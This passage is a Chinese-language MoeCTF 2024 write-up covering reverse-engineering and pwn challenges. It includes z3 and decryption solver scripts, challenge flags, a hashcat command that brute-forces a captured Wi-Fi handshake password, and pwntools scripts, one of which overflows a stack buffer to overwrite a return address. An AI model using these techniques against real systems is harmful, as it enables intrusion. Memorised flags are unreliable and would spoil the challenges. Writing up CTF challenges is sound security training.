class="hljs-literal">null</span> | /system/bin/grep VOLUMEUP &gt;/dev/<span class="hljs-literal">null</span>`); then<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;114514&quot;</span><br>  <span class="hljs-keyword">else</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1919810&quot;</span><br>  fi<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> testk; then<br>  ui_print <span class="hljs-string">&quot;Great! Now enter the secret.&quot;</span><br><br>  <span class="hljs-keyword">else</span><br>  ui_print <span class="hljs-string">&quot;Legacy Device. Use a newer device to do this challenge&quot;</span><br>  <span class="hljs-keyword">exit</span><br>  fi<br><br>  concatenated=<span class="hljs-string">&quot;&quot;</span><br><br>  <span class="hljs-keyword">for</span> i in <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br>    <span class="hljs-keyword">do</span><br>      result=$(choose)<br>        concatenated=<span class="hljs-string">&quot;$&#123;concatenated&#125;$&#123;result&#125;&quot;</span><br>        done<br><br>          input_str=$(<span class="hljs-keyword">echo</span> -n <span class="hljs-variable">$concatenated</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>          sec=<span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br>          <span class="hljs-keyword">if</span> test <span class="hljs-variable">$input_str</span> = <span class="hljs-variable">$sec</span><br>            then<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are right!Flag is&#x27;</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moectf<span class="hljs-subst">&#123;$concatenated&#125;</span>&quot;</span><br>            <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong. Try again.&#x27;</span><br>            <span class="hljs-keyword">exit</span><br>            fi<br></code></pre></td></tr></table></figure>



<h2 id="Cython-Strike"><a href="#Cython-Strike" class="headerlink" title="Cython_Strike"></a>Cython_Strike</h2><p>得到whl，看格式是zip，解压得到pyd</p>
<p>有一些打印出来的描述和很像flag的字符串，但不知道如何加密了</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794082239-1f5187f0-1d2c-4d59-b427-1cc80757b37e.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>先用python3.12导入，help之后看方法，mask刚好是运行获得的</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794067248-dfc751dc-3e6c-4f15-a2b0-6f79c39cad3e.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>需要知道输入的密码，两个方程算出来的input不一样，都去试一下发现第二个是对的</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794193586-b9dcc0cd-276e-44d1-94bb-83d9113bfad1.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>后面发现&#x3D;&#x3D;优先级高于^，也就是说第一个方程没用，同时真正的flag和上面的字符串长度一样，但不知道如何代换的</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794288624-396fbbc5-8493-48cc-840e-498c2fd2bf3c.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723795016076-4fcc7ef5-fe44-4887-9f60-7d7b3beca049.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>发现和ida显示的一摸一样</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794998339-b10e992b-c73a-4ef5-9ba5-2bc5a557cda7.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="babe-z3"><a href="#babe-z3" class="headerlink" title="babe_z3"></a>babe_z3</h2><p>通过推理可得，v4最后要不等于0，而23行强制类型转化之后也要不等于0，那么v4|&#x3D;0x100000000之后要为0x100000000，也就是说一开始v4为0，即第一个表达式没用</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723949889550-5afdc433-ff84-47cc-8481-3e6b65b3335a.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>这里v6,v7,v8其实都是s的一部分，也就是说都要打印</p>
<p>最后得到的字符串都要逆序因为按小端序存储</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 定义变量</span><br>s = BitVec(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">64</span>)<br>v6 = BitVec(<span class="hljs-string">&#x27;v6&#x27;</span>, <span class="hljs-number">64</span>)<br>v7 = BitVec(<span class="hljs-string">&#x27;v7&#x27;</span>, <span class="hljs-number">64</span>)<br>v8 = BitVec(<span class="hljs-string">&#x27;v8&#x27;</span>, <span class="hljs-number">64</span>)<br>v4 = BitVec(<span class="hljs-string">&#x27;v4&#x27;</span>, <span class="hljs-number">64</span>)<br>solver = Solver()<br><br>solver.add((v7 &amp; s &amp; v8 | (~(v6 | s) | v6 &amp; v7) &amp; v6 &amp; s) == <span class="hljs-number">0x2024243035302131</span>)<br>solver.add((v6 ^ (v7 &amp; (s + v7) | v8 &amp; ~(v7 &amp; s) | v6 &amp; (v6 + v8) &amp; ~s)) == <span class="hljs-number">0x7071001344417B54</span>)<br>solver.add(((v7 - v8) ^ (s - v6)) == <span class="hljs-number">0x3FE01013130FFD3</span>)<br>solver.add((s + v7 - v8 + v6) * (v8 + s + v6 - v7) == <span class="hljs-number">0x1989A41A9049C5C9</span>)<br>solver.add((v7 + v6 + s + v8) % <span class="hljs-number">0x1BF52</span> == <span class="hljs-number">21761</span>)<br>solver.add(v8 * v7 * v6 * s % <span class="hljs-number">0x1D4B42</span> == <span class="hljs-number">827118</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    <span class="hljs-built_in">print</span>(model[s].as_long(),end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[s].as_long()),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v6].as_long()), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v7].as_long()), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v8].as_long()))<br><br>s=<span class="hljs-string">&#x27;cd5250c9dbc4fdab1760517947e35495&#x27;</span><br>a=<span class="hljs-string">&#x27;&#x27;</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">8</span>):<br>    a=s[i:i+<span class="hljs-number">8</span>]<br>    a=a[::-<span class="hljs-number">1</span>]<br>    s1+=a<br><span class="hljs-comment">#print(s1)</span><br></code></pre></td></tr></table></figure>

<h2 id="BlackHole-2"><a href="#BlackHole-2" class="headerlink" title="BlackHole-2"></a>BlackHole-2</h2><p>dll有vmp壳</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724832562212-3d248860-6178-4047-8cfe-10c27dbb9dce.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="moeprotector"><a href="#moeprotector" class="headerlink" title="moeprotector"></a>moeprotector</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161326570-4e6be3d3-524d-4567-b464-38a877d1fdec.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161138144-4d81b94a-08f2-402b-8459-b715d00b61b9.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>静态分析到这里，发现比较复杂，需要结合动调</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724162238375-c925b571-bba9-4c15-9c36-201c917c1dcf.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>输入0能触发第一次异常</p>
<p>输入长度符合触发第二次异常</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724310928181-2c3ef0d4-bbf6-4b1b-8366-b0b98806b806.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></code></pre></td></tr></table></figure>

<p>到这里有反调试，需要用ScyllaHide插件反反调试</p>
<p><a target="_blank" rel="noopener" href="https://github.com/x64dbg/ScyllaHide/releases/tag/v1.4">Release v1.4 · x64dbg&#x2F;ScyllaHide (github.com)</a></p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724312564780-41636bf7-54b3-40eb-b12d-83adb5bb5d7a.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>动态调试发现8个密文一组</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380176738-e0b153c0-d43f-4c63-aa95-49391ee58424.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>对最后一位进行处理，总共三次循环，基本逻辑差不多</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380241829-f415a6cc-ebba-4b08-b123-43ae15ce2f20.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>正常分析大概是这样，但是逆不明白</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380762344-07d413bc-89e7-42e2-87b4-6d9a14bf68b6.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380290986-a3acea4f-9120-4f07-aa42-a25c0ed30f01.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>有个思路是57位明文，8个一组，那么最后一位多余了，但是一般的算法要么直接是8的整数倍，要么填充到8的整数倍，这里没有，猜测是不是所有位处理方式都是一样的，都按最后一位的加密逻辑来，尝试一下发现真的是这样，所以前面的加密可能是在混淆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[  <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x8D</span>,<br>   <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x4C</span>,<br>   <span class="hljs-number">0x33</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x82</span>,<br>   <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x91</span>,<br>   <span class="hljs-number">0x46</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>,<br>   <span class="hljs-number">0x44</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x8F</span>]<br><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><br><span class="hljs-comment"># ecx=0</span><br><span class="hljs-comment"># esi=0x15151515151515151515151515151515</span><br><span class="hljs-comment"># edx=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+esi)^input1[ecx])+edx</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x4e)+0x14</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><span class="hljs-comment"># edx=0x1A1A1A1A1A1A1A1A1A1A1A1A1A1A1A1A</span><br><span class="hljs-comment"># dsi=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+edx)^input1[ecx])+esi</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x53)+0x14</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><span class="hljs-comment"># edx=0x19191919191919191919191919191919</span><br><span class="hljs-comment"># esi=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+edx)^input1[ecx])+esi</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x51)+0x14</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x19</span>)<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x1a</span>)<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x15</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i]+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br><span class="hljs-comment">#moectf&#123;w1Nd0Ws_S3H_15_A_g0oD_m37h0d_70_h4nd13_EXCEPTI0NS&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="闻风而动-2"><a href="#闻风而动-2" class="headerlink" title="闻风而动-2"></a>闻风而动-2</h2><p>先脱壳</p>
<p>根据调试发现一次生成一位</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727427480249-4165aa13-80c7-405f-acb4-ea6e14c9a8f6.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>aaaaaaaa:^0x44 ^0x1d ^0x4a ^0x7 ^0x44 ^0x49 ^0x1b ^0x5e </p>
<p>abcdegh:^0x44 ^0x1d ^0x4a ^0x7 ^0x44 ^0x49 ^0x1b ^0x5e </p>
<p>得出结论每一位异或的数固定，后续发现没什么用</p>
<p>将流量包转为22000文件</p>
<p><code>.\hashcat -m 22000 -a 3 output.22000 ?1?1?1?1?1?1?1?1 -1 hilmnoprsuvwxyz</code>爆破22min得到密码pzyisxnn</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727449908854-6374d9ba-ba25-45f4-bc6f-fe1f69a1cc1e.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>得到服务器端加密密钥4g3n71u0</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727487798647-80d809db-c31a-473a-9a24-38910e0178a7.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>findcrypt发现有des</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727492987385-25589b18-be35-4b44-bbbb-09e1e6698595.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>flag长度为66</p>
<p>把srv放在win虚拟机上，发现没成功</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727495663055-19e07821-3172-4245-97d6-a8cb6f3a1dcf.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>后续直接调试srv.exe，输入对应长度的flag和psw后输入ip和addr</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727529028621-a6ba0d7f-e6a0-4857-9346-ca328fc26a00.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>32位长度高低位交换</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727531030045-42d0368b-fca3-4c7f-99fe-b973f5573f40.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>调试发现不是标准des，不想做了</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="入门指北-1"><a href="#入门指北-1" class="headerlink" title="入门指北"></a>入门指北</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723452710680-d24b362c-afec-48e0-bb71-76b8c998e036.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a>NotEnoughTime</h2><p>用pwntools进行四则运算，注意发送的时候向下取整，因为结果是负数会wrong，直接str也是wrong</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-comment">#filename=&#x27;./lockedshell&#x27;</span><br><span class="hljs-comment">#elf = ELF(filename)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">34401</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&quot;Let&#x27;s begin with simple ones.\n&quot;</span>)<br>sla(<span class="hljs-string">&quot;1 + 1 = &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;4 / 3 - 1 = &quot;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>ru(<span class="hljs-string">&quot;OK, then some tough ones. Be WELL PREPARED!\n&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;i=&quot;</span>,i)<br>	data=ru(<span class="hljs-string">&quot; = &quot;</span>)<br>	exp = data.decode().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>	exp=exp.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>	<span class="hljs-comment">#print(&#x27;exp:&#x27;,exp)</span><br>	a=<span class="hljs-built_in">eval</span>(exp)<br>	a=<span class="hljs-built_in">int</span>(a)<br>	<span class="hljs-keyword">if</span> a&lt;<span class="hljs-number">0</span>:<br>		a=a-<span class="hljs-number">1</span><br>	sl(<span class="hljs-built_in">str</span>(a).encode())<br>pr()<br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="no-more-gets"><a href="#no-more-gets" class="headerlink" title="no_more_gets"></a>no_more_gets</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723442517386-40a34cfe-0f2e-4e3f-85f3-f710611ac63c.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>溢出修改返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./lockedshell&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">42943</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ret=<span class="hljs-number">0x40129E</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(<span class="hljs-number">0x401176</span>)<br>sla(<span class="hljs-string">&quot;This is my own shell, enter the password or get out.\n&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="leak-sth"><a href="#leak-sth" class="headerlink" title="leak_sth"></a>leak_sth</h2><p>随机数固定在rsp+8处</p>
